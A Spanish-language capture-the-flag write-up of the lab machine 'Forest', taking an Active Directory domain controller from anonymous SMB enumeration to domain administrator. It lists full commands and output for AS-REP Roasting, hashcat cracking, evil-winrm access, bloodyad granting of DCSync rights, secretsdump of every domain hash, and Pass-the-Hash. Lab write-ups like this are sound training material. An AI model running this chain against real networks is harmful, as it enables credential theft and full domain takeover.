00 — Overview

Resumen Ejecutivo

Forest es un Domain Controller con Exchange instalado que ilustra un attack path clásico pero todavía frecuente en redes Windows corporativas: AS-REP Roasting para obtener un primer acceso como service account, seguido de abuso de permisos de Exchange Trusted Subsystem para otorgarse derechos de DCSync sobre el dominio.

La enumeración de usuarios vía SMB nulo funciona sin credenciales, exponiendo toda la lista de cuentas. svc-alfresco tiene desactivada la pre-autenticación Kerberos, entregando su hash AS-REP. Una vez dentro, el grupo Account Operators permite manipular grupos de Exchange, que a su vez dan WriteDACL sobre el dominio — suficiente para hacer DCSync y obtener todos los hashes del NTDS.dit.

Attack Path
SMB null → user enum RID brute → AS-REP Roasting svc-alfresco → hashcat -m 18200 → s3rvice → WinRM → bloodyad add Exchange groups → add DCSync rights → impacket-secretsdump → Administrator hash → Pass-the-Hash

02 — Enum

User Enum vía SMB null — svc-alfresco visible

Fase 02
Sesión nula → lista completa de usuarios del dominio

La autenticación nula está habilitada. nxc con usuario vacío devuelve la lista completa de usuarios del dominio incluyendo cuentas de servicio. Entre los usuarios no-HealthMailbox aparecen: sebastien, lucinda, svc-alfresco, andy, mark, santi.

nxc smb 10.129.19.183 -u '' -p '' --users | awk '{print $5}' > users.txt
svc-alfresco / sebastien / lucinda / andy / mark / santi
# + HealthMailbox*, SM_*, $331000-VK4ADACQNUCA (Exchange accounts)
03 — AS-REP Roasting

svc-alfresco sin pre-auth Kerberos → hash AS-REP crackeable

Fase 03
GetNPUsers → $krb5asrep$23$ svc-alfresco → hashcat -m 18200 → s3rvice

AS-REP Roasting funciona cuando una cuenta tiene desactivado el flag UF_DONT_REQUIRE_PREAUTH: el KDC devuelve un AS-REP cifrado con la clave del usuario sin necesidad de demostrar identidad. El hash etype 23 (RC4) se crackea offline con hashcat en segundos con rockyou.

impacket-GetNPUsers htb.local/guest -dc-ip 10.129.19.183 -usersfile users.txt -request -no-pass
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ea8fcd60...[hash AS-REP]

hashcat -m 18200 svc-alfresco-hash.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...: s3rvice
04 — Initial Shell

WinRM como svc-alfresco — Account Operators

Fase 04
evil-winrm → shell → svc-alfresco es Account Operator

svc-alfresco tiene acceso WinRM y es miembro de Account Operators y Privileged IT Accounts. Account Operators puede añadir usuarios a la mayoría de grupos del dominio incluyendo grupos de Exchange, lo que es el vector de escalada.

evil-winrm -i 10.129.19.183 -u svc-alfresco -p s3rvice

*Evil-WinRM* PS> whoami /groups | findstr "Account Operators"
BUILTIN\Account Operators  Enabled

type C:\Users\svc-alfresco\Desktop\user.txt
9d43be6e04be92f5c34c2dc86d3437f6
05 — Privilege Escalation

Exchange Trusted Subsystem — WriteDACL sobre el dominio

Fase 05
svc-alfresco → Exchange groups → WriteDACL en htb.local → DCSync rights

El grupo Exchange Windows Permissions tiene WriteDACL sobre el objeto raíz del dominio. Account Operators puede añadir miembros a este grupo. Con WriteDACL añadimos derechos de DCSync (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) a svc-alfresco.

bloodyad --host 10.129.19.183 -d htb.local -u svc-alfresco -p s3rvice add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS

bloodyad --host 10.129.19.183 -d htb.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco
[+] svc-alfresco is now able to DCSync
06 — DCSync

impacket-secretsdump → NTDS.dit completo

Fase 06
secretsdump via DRSUAPI → todos los hashes del dominio → Administrator PtH

Con derechos DCSync, impacket-secretsdump usa el protocolo DRSUAPI para sincronizar todas las credenciales del NTDS.dit directamente del DC sin necesidad de acceso físico ni volcar el archivo. Obtenemos el hash NTLM del Administrator del dominio y hacemos Pass-the-Hash para acceso completo.

impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.19.183
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
htb.local\svc-alfresco:1147:...:9248997e4ef68ca2bb47ae4e6f128668:::
# + todos los hashes de HealthMailbox, SM_, krbtgt, domain users

evil-winrm -i 10.129.19.183 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
*Evil-WinRM* PS C:\Users\Administrator\Documents>
